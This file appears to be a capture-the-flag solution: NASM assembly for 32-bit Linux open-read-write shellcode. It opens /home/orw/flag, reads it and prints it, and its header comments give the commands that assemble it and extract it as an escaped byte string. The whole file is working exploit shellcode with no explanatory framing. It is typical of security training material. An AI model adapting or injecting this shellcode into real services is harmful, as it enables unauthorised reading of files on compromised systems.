; nasm -f elf32 orw_shellcode.asm -o orw_shellcode.o
; objdump -d ./orw_shellcode.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

segment .text

_start:
xor ecx,ecx                  ; clear the ecx registry
mov eax, 0x5                 ; sys_open
push ecx                     ; push a NULL value unto the stack
push 0x67616c66       		 ; galf (flag)
push 0x2f77726f        		 ; /wro (orw/)
push 0x2f656d6f        		 ; /emo (ome/)
push 0x682f2f2f         	 ; h/// (///h)
mov ebx, esp               	 ; move contents to ebx
xor edx, edx                 ; clear the edx registry(file permissions)
int 0x80                     ; interrupt, call the kernel to execute the syscall

mov eax, 0x3              	 ; sys_read
mov ecx, ebx              	 ; contents of the flag file
mov ebx, 0x3              	 ; fd
mov dl, 0x30               	 ; decimal 48, used for the interrupt
int 0x80                     ; interrupt, call the kernel to execute the syscall

mov eax, 0x4              	 ; sys_write
mov bl, 0x1                  ; decimal 1, used for the interrupt
int 0x80                     ; interrupt, call the kernel to execute the syscall